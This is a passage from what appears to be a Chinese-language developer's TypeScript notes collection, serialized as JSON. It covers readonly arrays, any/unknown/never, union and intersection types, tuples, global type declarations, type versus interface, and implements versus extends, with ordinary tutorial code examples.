[!danger]\n**有点和自己理解的有偏差**，把 `readonly number[]` 当做是父类，`number[]` 子类，子类继承父类，所以会多出 比如 `pop` `push` 等可改变数组的方法\n\n---\n\n（4）使得数组可读的其他方法\n\n```typescript\n① readonly与数组的泛型写法一起使用，就会报错\n// 报错\nconst arr:readonly Array<number> = [0, 1];\n\n② TypeScript 提供了两个专门的泛型，用来生成只读数组的类型\nconst a1:ReadonlyArray<number> = [0, 1];\nconst a2:Readonly<number[]> = [0, 1];\n\n③ as const告诉 TypeScript，推断类型时要把变量arr推断为只读数组，从而使得数组成员无法改变。\n\nconst arr = [0, 1] as const;\narr[0] = [2]; // 报错 \n\n```\n\n#### 6.2.5. 多维数组\n\n```typescript\n① TypeScript 使用T[][]的形式，表示二维数组，T是最底层数组成员的类型\n\nvar multi:number[][] = [1,2,3], [23,24,25](/post/JpwFLP0g.html#1,2,3],-[23,24,25);\n```\n\n### 6.3. any 、null 、 undefined 、void\n\n1、`any` 告诉 **TypeScript 编译器**不要进行任何的类型检查，失去了类型检查的意义，另外会造成**类型污染** ，如下：\n\n```typescript\nlet user: any = {\n  avatar: {\n    url: '/user-1.png'\n  }\n};\nlet avatar = user.avatar; // any\nlet url = avatar.url; // any\n```\n\n使用场景：\n\n- 老旧项目，年代久远的项目\n- 其他特殊原因：需要关闭具体变量的类型检查\n\n另外，可通过 `tsc --noImplicitAny app.ts` 启动 `any` 检查\n\n2、`null` 、 `undefined` : 任何类型，都能再赋值为 `null` 和 `undefined` ，如下代码\n\n```typescript\n// strictNullChecks: false\nlet num: number;\nlet str: string;\n\n// 这些类型能被赋予\nnum = null;\nstr = undefined;\n\n它们的类型会被推断为any。\nlet a = undefined;   // any\nconst b = undefined; // any\n\nlet c = null;        // any\nconst d = null;      // any\n\n\n// 打开编译设置 strictNullChecks = true\nlet a = undefined;   // undefined\nconst b = undefined; // undefined\n\nlet c = null;        // null\nconst d = null;      // null\n\n\n// tsc --strictNullChecks app.ts\nlet age:number = 24;\nage = null;      // 报错\nage = undefined; // 报错\n\n\n// 打开 strictNullChecks\n\nlet x:undefined = null; // 报错\nlet y:null = undefined; // 报错\n\n```\n\n**总之，打开 strictNullChecks 以后，undefined和null只能赋值给自身，或者any类型和unknown类型的变量**\n\n```typescript\nlet x:any     = undefined;\nlet y:unknown = null;\n```\n\n3、`void` 标识 函数没有返回值，即**空值** ，其实可以理解为 `null | undefined` \n\n### 6.4. never\n\n**代表永远不会发生** 的类型，是 TypeScript 中的 **底层类型** ， 看下面的两个示例：\n\n1. 一个总是会抛出错误的函数\n2. 一个从来不会有返回值的函数，因为里面包含 `while(true)`\n\n![|712](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/b010c6ee18dfa882025d20df3366730d.png)\n\n看一个具体**案例**：\n\n![|640](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/edc5b68e55702c323c6b2660dcec33a0.png)\n\n或者如下代码，统一包装一个 `fail` 函数\n\n```typescript\nfunction foo(x: string | number): boolean {\n  if (typeof x === 'string') {\n    return true;\n  } else if (typeof x === 'number') {\n    return false;\n  }\n\n  // 如果不是一个 never 类型，这会报错：\n  // - 不是所有条件都有返回值 （严格模式下）\n  // - 或者检查到无法访问的代码\n  // 但是由于 TypeScript 理解 `fail` 函数返回为 `never` 类型\n  // 它可以让你调用它，因为你可能会在运行时用它来做安全或者详细的检查。\n  return fail('Unexhaustive');\n}\n\nfunction fail(message: string): never {\n  throw new Error(message);\n}\n```\n\n>  1、注意：抛出异常后就直接中断程序了\n  2、**never 仅能被赋值给另外一个 never 类型**\n\n### 6.5. Unknown\n\n1、使用 `any` 有很多弊端 ，参考如上，这就引出了 `unknown`\n\n2、`any` 和 `unknown` 的 **本质区别**：\n\n - unknown 是 `top type` (任何类型都是它的 subtype) \n - 而 **any 即是 top type, 又是 bottom type** (它是任何类型的 `subtype` ) ，这导致 any 基本上就是放弃了任何类型检查。\n\n所以， **`any`** 和 **`unknown`** 的 交集 和 并集都是 `any` , 如下代码：\n\n```typescript\ntype U6 = unknown | any; // any\ntype U12 = unknown & any; // any;\n```\n\n3、 `unknown` 类型的值只能赋给 `unknown` 本身和 `any` 类型\n\n4、联合类型取最大集合，即**并集** ， 交叉类型中，取最小集合，即**交集** ，那么 unknown 的 联合类型 和 交叉类型如何呢？\n\n```typescript\n// 联合类型\ntype U1 = unknown | null; // unknown\ntype U2 = unknown | undefined; // unknown\ntype U3 = unknown | number; // unknown\ntype U4 = unknown | boolean; // unknown\ntype U5 = unknown | string[]; // unknown\ntype U6 = unknown | any; // any\n\n// 交叉类型\ntype U7 = unknown & null; // null;\ntype U8 = unknown & undefined; // undefined;\ntype U9 = unknown & number; // number;\ntype U10 = unknown & boolean; // boolean;\ntype U11 = unknown & string[]; // string[]\ntype U12 = unknown & any; // any;\n```\n\n总结一下就是： **unknown 也可以视为所有其他类型（除了any）的全集**\n\nTypeScript 有两个“**顶层类型**”（`any`和`unknown`），但是 **“底层类型”** 只有`never`唯一一个 \n\n### 6.6. 值类型\n\n即 单个值也是一种类型，称为“**值类型**”。\n\n```typescript\nlet x:'hello';\n\nx = 'hello'; // 正确\nx = 'world'; // 报错\n\nconst x:5 = 4 + 1; // 报错\n// 在4 + 1后面加上as 5，就是告诉编译器，可以把 4 + 1的类型 视为值类型5 \nconst x:5 = (4 + 1) as 5; // 正确\n\n```\n\n> 单个值的值类型，用处不大，更多是配合 **联合类型** 使用\n\n### 6.7. 联合类型\n\n```typescript\n\n① 常用示例\n\nlet x:string|number;\n\nlet setting:true|false;\n\nlet gender:'male'|'female';\n\nlet rainbowColor:'赤'|'橙'|'黄'|'绿'|'青'|'蓝'|'紫';\n\n// strictNullChecks = true\nlet nullOrUndefined = undefined | null\n\n// 方便书写\nlet x:\n  | 'one'\n  | 'two'\n  | 'three'\n  | 'four';\n\n② 如果一个变量有多种类型，读取该变量时，往往需要进行“类型缩小”，比如：\n\nfunction printId(\n  id:number|string\n) {\n    console.log(id.toUpperCase()); // 报错\n}\n\n// 修改为 =========> \n\nfunction printId(\n  id:number|string\n) {\n  if (typeof id === 'string') {\n    console.log(id.toUpperCase());\n  } else {\n    console.log(id);\n  }\n}\n\n③ “类型缩小”的另一个例子\n\nfunction getPort(\n  scheme: 'http'|'https'\n) {\n  switch (scheme) {\n    case 'http':\n      return 80;\n    case 'https':\n      return 443;\n  }\n}\n\n\n```\n\n>  实际上，联合类型本身可以看成是一种“**类型放大**”（type widening），处理时就需要“**类型缩小**”（type narrowing）\n\n### 6.8. 交叉类型\n\n交叉类型 `A&B` 表示，任何一个类型必须同时属于 `A` 和`B`，才属于交叉类型 `A&B`，即交叉类型同时满足`A`和`B`的特征。下面是示例\n\n```typescript\n\n① 变量obj同时具有属性foo和属性bar\nlet obj:\n  { foo: string } &\n  { bar: string };\n\nobj = {\n  foo: 'hello',\n  bar: 'world'\n};\n\n② x的类型实际是 never ，因为不可能有这样的 x \n\nlet x:number&string;\n\n③ 交叉类型常常用来为对象类型添加新属性。\n\ntype A = { foo: number };\ntype B = A & { bar: number };\n\n```\n\n### 6.9. type 命令\n\n`type` 命令用来定义一个类型的`别名`\n\n```typescript\n\n① 别名 Age 类型\ntype Age = number;\nlet age:Age = 55;\n\n② 别名不允许重名\ntype Color = 'red';\ntype Color = 'blue'; // 报错\n\n③ 别名的作用域是块级作用域\ntype Color = 'red';\nif (Math.random() < 0.5) {\n  type Color = 'blue';\n}\n\n④ 别名支持使用表达式\ntype World = \"world\";\ntype Greeting = `hello ${World}`;\n```\n\n>  type命令属于类型相关的代码，编译成 JavaScript 的时候，会被 ==全部删除==\n\n### 6.10. typeof 运算符\n\n1、JavaScript 里面，`typeof` 运算符只可能返回 **八种结果**，而且都是**字符串**。\n\n```javascript\ntypeof undefined; // \"undefined\"\ntypeof true; // \"boolean\"\ntypeof 1337; // \"number\"\ntypeof \"foo\"; // \"string\"\ntypeof {}; // \"object\"\ntypeof parseInt; // \"function\"\ntypeof Symbol(); // \"symbol\"\ntypeof 127n // \"bigint\"\n```\n\n2、TypeScript `typeof` 运算符将返回 该值的 **TypeScript 类型**\n\n```typescript\nconst a = { x: 0 };\n\ntype T0 = typeof a;   // { x: number }\ntype T1 = typeof a.x; // number\n```\n\n3、类型运算 与 值运算\n\n- `typeof` 返回的是 TypeScript 类型，所以只能用在**类型运算**之中（即跟==类型相关的代码之中==），不能用在 **值运算**\n- `typeof` 的参数不能是一个值的运算式，如下示例：\n\n```typescript\n// Date()需要运算才知道结果\ntype T = typeof Date(); // 报错\n```\n\n- `typeof` 命令的参数不能是类型。如下代码\n```typescript\ntype Age = number;\ntype MyAge = typeof Age; // 报错\n```\n\n### 6.11. 类型声明的块级作用域\n\n```typescript\n存在两个代码块，其中分别有一个类型T的声明, 这两个声明都只在自己的代码块内部有效，在代码块外部无效。\nif (true) {\n  type T = number;\n  let v:T = 5;\n} else {\n  type T = string;\n  let v:T = 'hello';\n}\n```\n\n### 6.12. 子类型与父类型\n\n即**子类型可以赋值给父类型**，但反过来不行，如下\n\n```typescript\n\n① 子类型 a 可以赋值给父类型 b\n\ntype T = number|string;\n\nlet a:number = 1;\nlet b:T = a; \n\n② 父类型 b 不可以赋值给 子类型 a\n\nlet a:'hi' = 'hi';\nlet b:string = 'hello';\n\nb = a; // 正确\na = b; // 报错\n```\n\n### 6.13. 元组\n\n#### 6.13.1. 基本示例\n\n```typescript\nconst s:[string, string, boolean] = ['a', 'b', true];\n\n// 数组\nlet a:number[] = [1];\n\n// 元组\nlet t:[number] = [1];\n```\n\n>  数组与元组的区别在于，`number[]` 与 `[number]`\n\n#### 6.13.2. 可选元素\n\n添加`?` 表示可选，比如\n\n```typescript\n① 正常用法\nlet a:[number, number?] = [1];\n\n② 它的成员数量可能有两个、三个和四个\ntype myTuple = [\n  number,\n  number,\n  number?,\n  string?\n];\n\n③ 扩展运算符（...），可以表示不限成员数量的元组\ntype NamedNums = [\n  string,\n  ...number[]\n];\nconst a:NamedNums = ['A', 1, 2];\nconst b:NamedNums = ['B', 1, 2, 3];\n\ntype t1 = [string, number, ...boolean[]];\ntype t2 = [string, ...boolean[], number];\ntype t3 = [...boolean[], string, number];\n```\n\n#### 6.13.3. 成员或者元素名\n\n元组的成员可以添加成员名，这个**成员名**是说明性的\n\n```typescript\ntype Color = [\n  red: number,\n  green: number,\n  blue: number\n];\nconst c:Color = [255, 255, 255];\n```\n\n#### 6.13.4. 读取成员类型\n\n元组可以通过方括号，**读取成员类型** \n\n```typescript\ntype Tuple = [string, number];\ntype Age = Tuple[1]; // number\n\n由于元组的成员都是数值索引，即索引类型都是number\ntype Tuple = [string, number, Date];\ntype TupleEl = Tuple[number];  // string|number|Date ,即 三种值的联合类型\n\n```\n\n#### 6.13.5. 只读元组\n\n```typescript\n// 写法一\ntype t = readonly [number, string]\n\n// 写法二：泛型 Readonly<T>\ntype t = Readonly<[number, string]>\n```\n\n只读元组是元组的父类型，所以 **谁可以给谁赋值知道了吗？**\n\n如下代码，为什么传入`只读元组`就会报错呢？因为 **只读元组不能替代元组**\n\n```typescript\nfunction distanceFromOrigin([x, y]:[number, number]) {\n  return Math.sqrt(x**2 + y**2);\n}\n\nlet point = [3, 4] as const;\n\ndistanceFromOrigin(point); // 报错\n\n问：如何解决这个报错问题呢？使用类型断言，如下：\ndistanceFromOrigin(\n  point as [number, number]\n)\n```\n\n#### 6.13.6. 成员数量的推断\n\n```typescript\n① ts 发现 元组point的长度是2，不可能等于3，报错\nfunction f(point: [number, number]) {\n  if (point.length === 3) {  // 报错\n    // ...\n  }\n}\n\n② TypeScript 发现point.length的类型是1|2|3，不可能等于4。\nfunction f(\n  point:[number, number?, number?]\n) {\n  if (point.length === 4) {  // 报错\n    // ...\n  }\n}\n\n③ 使用了扩展运算符，TypeScript 就无法推断出成员数量；故不会报错\nconst myTuple:[...string[]]\n  = ['a', 'b', 'c'];\n\nif (myTuple.length === 4) { // 正确\n  // ...\n}\n```\n\n#### 6.13.7. 扩展运算符与成员数量\n\n```typescript\n\n① 报错原因是函数add()只能接受两个参数，但是传入的是...arr，TypeScript 认为转换后的参数个数是不确定的\nconst arr = [1, 2];\nfunction add(x:number, y:number){\n  // ...\n}\nadd(...arr) // 报错\n\n② arr是一个拥有两个成员的元组，所以 TypeScript 能够确定...arr可以匹配函数add()的参数数量，就不会报错了\nconst arr:[number, number] = [1, 2];\nfunction add(x:number, y:number){\n  // ...\n}\nadd(...arr) // 正确\n\n或者 const arr = [1, 2] as const; 使用 as const 断言即可\n\n\n③ 因为console.log()可以接受任意数量的参数\nconst arr = [1, 2, 3];\nconsole.log(...arr) // 正确\n```\n\n### 6.14. symbol\n\n省略\n\n## 7. 参考\n\n- [https://jkchao.github.io/typescript-book-chinese/project/dynamicImportExpressions.html](https://jkchao.github.io/typescript-book-chinese/project/dynamicImportExpressions.html)\n- [https://ts.xcatliu.com/basics/primitive-data-types.html](https://ts.xcatliu.com/basics/primitive-data-types.html)\n - [https://www.fullstackbb.com/typescript/typescript-unknown-as-top-type/](https://www.fullstackbb.com/typescript/typescript-unknown-as-top-type/)\n  - [https://wangdoc.com/typescript/any](https://wangdoc.com/typescript/any)\n\n","vE30bouq":"\n# TypeScript 项目中使用 node_modules 中定义的全局类型\n\n`#typescript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 通过 tsconfig.json 配置 \n\n在 `tsconfig.json` 中配置 `typeRoots` 和 `types` 来引入类型定义：\n\n```json\n{\n  \"compilerOptions\": {\n    // typeRoots 用于指定类型声明文件的根目录\n    \"typeRoots\": [\n      \"./node_modules/@types\",\n      \"./node_modules/库名/types\",\n      \"./src/types\"\n    ],\n    // types 用于指定需要包含的类型声明\n    \"types\": [\n      \"node\",\n      \"jest\",\n      \"express\"\n    ]\n  }\n}\n```\n\n## 2. 通过 **reference** 引用\n\n在项目中创建类型声明文件（`.d.ts`），然后通过 `reference` 引用：\n\n```typescript\n// src/types/global.d.ts\n/// <reference types=\"node\" />\n/// <reference types=\"express\" />\n/// <reference path=\"../../node_modules/库名/types/index.d.ts\" />\n\n// 声明全局类型\ndeclare global {\n  interface Window {\n    // 使用第三方库定义的类型\n    customType: import('第三方库').CustomType;\n  }\n}\n```\n\n## 3. 直接导入类型\n\n```typescript\n// src/types/custom.ts\nimport type { SomeType } from 'some-library';\n\n// 重新导出类型\nexport type { SomeType };\n\n// 或者扩展类型\nexport interface ExtendedType extends SomeType {\n  additionalProp: string;\n}\n```\n\n## 4. 实际使用示例\n\n### 4.1. **使用 Express 类型**：\n\n```typescript\n// tsconfig.json\n{\n  \"compilerOptions\": {\n    \"types\": [\"express\"]\n  }\n}\n\n// src/types/express.d.ts\nimport { Request, Response } from 'express';\n\n// 扩展 Express 的 Request 接口\ndeclare global {\n  namespace Express {\n    interface Request {\n      user?: {\n        id: string;\n        name: string;\n      }\n    }\n  }\n}\n```\n\n### 4.2. **使用 Vue 类型**：\n\n```typescript\n// src/types/vue.d.ts\nimport type { ComponentCustomProperties } from 'vue'\n\ndeclare module '@vue/runtime-core' {\n  interface ComponentCustomProperties {\n    $myGlobal: string\n  }\n}\n\n// 使用\nexport default defineComponent({\n  created() {\n    console.log(this.$myGlobal) // 类型安全\n  }\n})\n```\n\n### 4.3. **使用 React 类型**：\n\n```typescript\n// src/types/react.d.ts\nimport 'react';\n\ndeclare module 'react' {\n  interface HTMLAttributes<T> extends AriaAttributes, DOMAttributes<T> {\n    // 添加自定义属性\n    customProp?: string;\n  }\n}\n\n// 使用\nconst MyComponent: React.FC = () => {\n  return <div customProp=\"value\">Hello</div>;\n}\n```\n\n### 4.4. **使用第三方库类型**：\n\n```typescript\n// src/types/third-party.d.ts\nimport type { Options } from 'some-library';\n\n// 扩展配置类型\ndeclare module 'some-library' {\n  interface Options {\n    extraOption?: boolean;\n  }\n}\n\n// 使用\nimport { someFunction } from 'some-library';\n\nconst options: Options = {\n  extraOption: true,\n  // ... 其他选项\n};\n```\n\n## 5. 最佳实践\n\n### 5.1. **组织类型文件**：\n\n```typescript\n// src/types/index.d.ts\n// 集中管理所有类型声明\n/// <reference path=\"./express.d.ts\" />\n/// <reference path=\"./vue.d.ts\" />\n/// <reference path=\"./react.d.ts\" />\n\n// 导出公共类型\nexport * from './models';\nexport * from './api';\n```\n\n### 5.2. **创建类型模块**：\n\n```typescript\n// src/types/models/index.ts\nexport interface User {\n  id: string;\n  name: string;\n}\n\nexport interface Post {\n  id: string;\n  title: string;\n}\n```\n\n### 5.3. **类型增强**：\n\n```typescript\n// src/types/enhanced.d.ts\nimport { AxiosRequestConfig } from 'axios';\n\ndeclare module 'axios' {\n  export interface AxiosRequestConfig {\n    customConfig?: {\n      retry?: number;\n      retryDelay?: number;\n    }\n  }\n}\n```\n\n### 5.4. **环境变量类型**：\n\n```typescript\n// src/types/env.d.ts\ndeclare global {\n  namespace NodeJS {\n    interface ProcessEnv {\n      NODE_ENV: 'development' | 'production';\n      API_KEY: string;\n      // ... 其他环境变量\n    }\n  }\n}\n```\n\n## 6. 注意事项\n\n### 6.1. **类型声明文件命名**：\n\n   - 使用 `.d.ts` 后缀\n   - 文件名要有意义且清晰\n\n### 6.2. **模块解析**：\n\n```json\n// tsconfig.json\n{\n  \"compilerOptions\": {\n    \"moduleResolution\": \"node\",\n    \"baseUrl\": \"./\",\n    \"paths\": {\n      \"@/*\": [\"src/*\"],\n      \"@types/*\": [\"src/types/*\"]\n    }\n  }\n}\n```\n\n### 6.3. **类型检查**：\n\n```typescript\n// 确保类型正确导入\nimport type { SomeType } from 'some-library';\n// 使用 typeof 获取变量的类型\ntype Config = typeof import('./config').default;\n```\n\n","1KBnUj7w":"\n# type 和 interface 的区别\n\n`#typescript` \n\nTypeScript 中的 `type` 和 `interface` 都用于定义类型\n\n>  另外可见 [4. interface](/post/kh6hthMf.html)\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 语法和用途 \n\n### 1.1. type\n\n- **可以用于定义任何类型的别名**，包括`原始类型、联合类型、交叉类型`等\n- 语法更灵活\n\n```typescript hl:4\ntype Name = string;\ntype NameOrAge = string | number;\ntype Point = { x: number; y: number };\ntype Callback = (data: string) => void;\n```\n\n### 1.2. interface\n\n- 主要用于**定义对象**的结构\n- 更接近传统面向对象编程中的**接口**概念\n\n```typescript\ninterface Person {\n  name: string;\n  age: number;\n}\n```\n\n## 2. 扩展和实现\n\n### 2.1. type\n\n- 使用交叉类型（`&`）来**扩展**\n- 不能被类实现（`implements`）或继承（`extends`）\n\n```typescript\ntype Animal = {\n  name: string\n}\n\ntype Bear = Animal & { \n  honey: boolean \n}\n```\n\n### 2.2. interface：可被实现和扩展\n\n- 可以使用 `extends` 关键字==扩展==其他接口或类型\n- 可以被==**类**==实现（`implements`）或继承（`extends`）\n\n```typescript\ninterface Animal {\n  name: string\n}\n\ninterface Bear extends Animal {\n  honey: boolean\n}\n\nclass Grizzly implements Bear {\n  name: string;\n  honey: boolean;\n}\n```\n\n## 3. 合并声明\n\n### 3.1. type\n\n- 不支持声明合并\n\n```typescript hl:5\ntype User = {\n  name: string\n}\n\n// 错误：标识符\"User\"重复。\ntype User = {\n  age: number\n}\n```\n\n### 3.2. interface\n\n- 支持声明合并，多次声明会**自动合并**\n\n```typescript\ninterface User {\n  name: string\n}\n\ninterface User {\n  age: number\n}\n\n// 结果等同于：\n// interface User {\n//   name: string\n//   age: number\n// }\n```\n\n## 4. 计算属性\n\n### 4.1. type\n\n- 支持使用映射类型等高级类型操作\n\n```typescript\ntype Keys = 'firstname' | 'surname'\n\ntype DudeType = {\n  [key in Keys]: string\n}\n```\n\n### 4.2. interface\n\n- 不支持映射类型等操作\n\n## 5. 元组和数组\n\n### 5.1. type\n\n- 可以更容易地定义元组和复杂的数组类型\n\n```typescript\ntype StringNumberPair = [string, number];\ntype StringArray = string[];\n```\n\n### 5.2. interface\n\n- 可以定义数组，但定义元组相对复杂\n\n```typescript\ninterface StringNumberPair {\n  0: string;\n  1: number;\n  length: 2;\n}\n```\n\n## 6. 使用建议\n\n- 如果定义的类型可能需要扩展或者实现，使用 `interface`\n- 如果需要使用**联合类型、交叉类型、元组**等，或者需要利用映射类型等高级类型操作，使用 `type`\n- 在**创建第三方库或公共 API 时**，推荐使用 `interface`，因为它更容易扩展和兼容\n\n","V3pEa02i":"\n# TS 常见问题\n\n`#typescript` \n\n\n## 目录\n<!-- toc -->\n ## 1. typescript 中 unknown、any、void 的区别 \n\n### 1.1. **类型安全性**\n\n- `any`: \n\t- 完全不安全，跳过类型检查\n- `unknown`: \n\t- 类型安全，需要类型检查才能使用\n- `void`: 类型安全，只能赋值 undefined 或 null\n\t- `void`其实可以理解为`null`和`undefined`的`联合类型`，它表示空值\n\n### 1.2. **使用场景**\n\n- `any`: \n\t- 当你不确定类型，或者需要快速迁移 JavaScript 代码时使用\n- `unknown`: \n\t- 当你不确定输入类型，但想保持类型安全时使用\n- `void`: 主\n\t- 要用于表示函数没有返回值\n\n### 1.3. **操作限制**\n\n- `any`: \n\t- 没有任何限制\n- `unknown`: \n\t- 必须先进行**类型检查或断言**\n- `void`: \n\t- 只能赋值 `undefined` 或 `null`\n\n### 1.4. **最佳实践**\n\n- 尽量避免使用 `any`，因为它会失去 TypeScript 的类型检查优势\n- 如果不确定类型，优先使用 `unknown` 而不是 `any`\n- `void` 主要用于函数返回类型声明\n\n## 2. ts 的类型保护\n\n==类型保护==主要的想法是尝试检测属性、方法或原型，以弄清楚如何处理一个值。\n- 有四种使用类型保护的主要方法\n\t- 分别是 \n\t\t- `in`，\n\t\t- `typeof`，\n\t\t- `instanceof`，\n\t\t- `类型谓词is`\n\n- `typeof` 类比于 js 的`typeof`\n- `instanceof` 类比于 js 的`instanceof`\n- `in` 如下检查某个对象上是否存在某个属性\n\t- ![图片&文件](./files/20241114-21.png)\n- is \n\t- ![图片&文件](./files/20241114-22.png)\n\n## 3. implements 与 extends 的区别\n\n![图片&文件](./files/20241114-23.png)\n\n>   类不能继承接口，只能实现`接口` ，但`接口`可以继承`接口`\n\n### 3.1. extends（继承）\n\n- 用于**类**继承**类**\n- 用于**接口**继承**接口**\n- 用于**类型约束**\n- 继承父类的所有成员（属性和方法）\n\n```typescript hl:13,20\n// extends 示例\nclass Animal {\n  name: string;\n  constructor(name: string) {\n    this.name = name;\n  }\n  \n  move() {\n    console.log('Moving...');\n  }\n}\n\n// 类继承类\nclass Dog extends Animal {\n  bark() {\n    console.log('Woof!');\n  }\n}\n\n// 接口继承接口\ninterface Shape {\n  color: string;\n}\n\ninterface Square extends Shape {\n  sideLength: number;\n}\n\n```\n\n### 3.2. implements（实现）\n\n- 用于**类**实现**接口**\n- 只实现接口的类型检查\n- **不包含具体实现代码**\n- 可以同时实现**多个接口**\n\n```javascript hl:7\n// implements 示例\ninterface Movable {\n  move(): void;\n  speed: number;\n}\n\n// 类实现接口\nclass Car implements Movable {\n  speed: number = 0;\n  \n  move() {\n    console.log('Car moving...');\n  }\n}\n```\n\n### 3.3. 多重继承与实现\n\n- `接口`可以继承多个`接口`\n- `类`只能继承一个`类`，但可以实现`多个接口`\n\n```typescript\n// 接口可以继承多个接口\ninterface A {\n  a(): void;\n}\n\ninterface B {\n  b(): void;\n}\n\ninterface C extends A, B {\n  c(): void;\n}\n\n// 类只能继承一个类，但可以实现多个接口\nclass MyClass extends BaseClass implements A, B, C {\n  a() { /* ... */ }\n  b() { /* ... */ }\n  c() { /* ... */ }\n}\n```\n\n### 3.4. 类 extends 会继承构造函数\n\n```typescript\n// extends 会继承构造函数\nclass Base {\n  constructor(public value: string) {}\n  \n  method() {\n    return this.value;\n  }\n}\n\nclass Derived extends Base {\n  // 可以使用 super 访问父类\n  constructor(value: string) {\n    super(value);\n  }\n  \n  newMethod() {\n    return super.method();\n  }\n}\n```\n\n### 3.5. 类的 implements 接口，只检查类型\n\n```typescript\n// implements 只检查类型\ninterface Printable {\n  print(): void;\n  content: string;\n}\n\nclass Printer implements Printable {\n  // 必须自己实现所有成员\n  content: string = '';\n  \n  print() {\n    console.log(this.content);\n  }\n}\n```\n\n### 3.6. extends 可以继承访问修饰符\n\n```typescript\nclass Parent {\n  private secret: string;\n  protected internal: string;\n  public visible: string;\n  \n  constructor() {\n    this.secret = 'secret';\n    this.internal = 'internal';\n    this.visible = 'visible';\n  }\n}\n\n// extends 可以继承访问修饰符\nclass Child extends Parent {\n  method() {\n    // this.secret; // 错误：private 在子类中不可访问\n    this.internal; // 正确：protected 在子类中可访问\n    this.visible;  // 正确：public 在子类中可访问\n  }\n}\n\n\n```\n\n### 3.7. 类 implements 只关注公共接口\n\n```typescript\n// implements 只关注公共接口\ninterface Visible {\n  visible: string;\n}\n\nclass Implementation implements Visible {\n  // 只需要实现公共接口\n  visible: string = 'visible';\n  \n  // 可以有自己的私有成员\n  private ownSecret: string = 'secret';\n}\n```\n\n### 3.8. extends 用于泛型约束\n\n```typescript\n// extends 用于泛型约束\ninterface HasLength {\n  length: number;\n}\n\n// T 必须包含 length 属性\nfunction logLength<T extends HasLength>(arg: T): void {\n  console.log(arg.length);\n}\n```\n\n### 3.9. implements 用于实现泛型接口\n\n```typescript\n// implements 用于实现泛型接口\ninterface Container<T> {\n  value: T;\n  getValue(): T;\n}\n\nclass Box<T> implements Container<T> {\n  constructor(public value: T) {}\n  \n  getValue(): T {\n    return this.value;\n  }\n}\n```\n\n### 3.10. 抽象类和接口\n\n```typescript\n// 抽象类可以包含实现\nabstract class AbstractClass {\n  abstract abstractMethod(): void;\n  \n  implementedMethod() {\n    console.log('This method has implementation');\n  }\n}\n\n// 接口只能包含声明\ninterface Interface {\n  method(): void;\n}\n\n// 使用 extends 继承抽象类\nclass ConcreteClass extends AbstractClass {\n  abstractMethod() {\n    console.log('Implemented abstract method');\n  }\n}\n\n// 使用 implements 实现接口\nclass ImplementingClass implements Interface {\n  method() {\n    console.log('Implemented interface method');\n  }\n}\n```\n\n### 3.11. 类型检查差异\n\n```typescript\n// extends 继承实现和类型\nclass Base {\n  baseMethod() { return 'base'; }\n}\n\nclass Derived extends Base {\n  derivedMethod() { return 'derived'; }\n}\n\nconst derived: Derived = new Derived();\nderived.baseMethod();     // 正确：继承了实现\nderived.derivedMethod();  // 正确：自己的方法\n\n// implements 只继承类型\ninterface Walkable {\n  walk(): void;\n  speed: number;\n}\n\nclass Human implements Walkable {\n  speed: number = 5;\n  \n  // 必须实现接口中的所有方法\n  walk() {\n    console.log('Walking...');\n  }\n  \n  // 可以有额外的方法\n  run() {\n    console.log('Running...');\n  }\n}\n```\n\n### 3.12. 实际应用场景\n\n```typescript\n// 使用 extends 的场景\n// 1. 共享代码实现\nabstract class HttpClient {\n  protected baseUrl: string;\n  \n  constructor(baseUrl: string) {\n    this.baseUrl = baseUrl;\n  }\n  \n  abstract request(url: string): Promise<any>;\n}\n\nclass RestClient extends HttpClient {\n  request(url: string): Promise<any> {\n    return fetch(this.baseUrl + url);\n  }\n}\n\n// 使用 implements 的场景\n// 1. 确保类型一致性\ninterface Repository<T> {\n  find(id: string): Promise<T>;\n  save(item: T): Promise<void>;\n}\n\nclass UserRepository implements Repository<User> {\n  async find(id: string): Promise<User> {\n    // 实现查找用户\n    return {} as User;\n  }\n  \n  async save(user: User): Promise<void> {\n    // 实现保存用户\n  }\n}\n\n// 2. 策略模式\ninterface PaymentStrategy {\n  pay(amount: number): void;\n}\n\nclass CreditCardPayment implements PaymentStrategy {\n  pay(amount: number) {\n    console.log(`Paying ${amount} with credit card`);\n  }\n}\n\nclass PayPalPayment implements PaymentStrategy {\n  pay(amount: number) {\n    console.log(`Paying ${amount} with PayPal`);\n  }\n}\n```\n\n### 3.13. 关键区别总结\n\n- **继承与实现**\n\t- `extends` 用于继承类的实现\n\t- `implements` 只用于实现接口的类型检查\n- **代码复用**\n\t- `extends` 可以复用父类的代码\n\t- `implements` 不提供代码复用\n- **多重使用**\n\t- 类只能 `extends` 一个类\n\t- 类可以 `implements` 多个接口\n- **访问修饰符**\n\t- `extends` 继承所有访问修饰符\n\t- `implements` 只关注公共接口\n- **构造函数**\n\t- `extends` 可以使用 `super()`\n\t- `implements` 不涉及构造函数继承\n- **使用场景**\n\t- `extends` 用于代码复用和类型继承\n\t- `implements` 用于确保类型一致性\n\n## 4. TypeScript 中 Interface 与 Type 的区别\n\n- `interface` 只能定义`对象类型`\n- `type` 声明可以声明任何类型。\n- `interface` 能够声明 **合并**，两个相同接口会 **合并**。`Type`声明合并会报错\n- `type`可以`类型推导`\n\t- ![图片&文件](./files/20241114-24.png)\n\n## 5. ts 中的 const 、 readonly 的区别\n\n- 一个用于变量，一个用于属性\n- `readonly` 修饰的**属性**能确保自身不能修改属性，","kh6hthMf":"\n# interface\n\n`#typescript` \n\n>  另外可参考 [2.  type 和 interface 的区别](/post/1KBnUj7w.html)\n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念 \n\nInterface 是 TypeScript 中一个核心概念，用于**定义对象的类型契约**。\n- 它描述了对象应该具有的属性和方法的结构。\n\n### 1.1. 基本语法\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n}\n\n// 使用接口\nconst person: Person = {\n    name: \"张三\",\n    age: 25\n}\n```\n\n## 2. 可选属性\n\n使用 `?` 表示属性是可选的：\n\n```typescript\ninterface Config {\n    color?: string;\n    width?: number;\n}\n\n// 以下都是合法的\nconst config1: Config = { color: \"red\" };\nconst config2: Config = { width: 100 };\nconst config3: Config = {};\n```\n\n## 3. 只读属性\n\n使用 `readonly` 修饰符使属性只读：\n\n```typescript\ninterface Point {\n    readonly x: number;\n    readonly y: number;\n}\nconst p1: Point = { x: 10, y: 20 };\n// p1.x = 5; // 错误！x 是只读的\n```\n\n## 4. 函数类型接口\n\n接口也可以描述函数类型：\n\n```typescript\ninterface 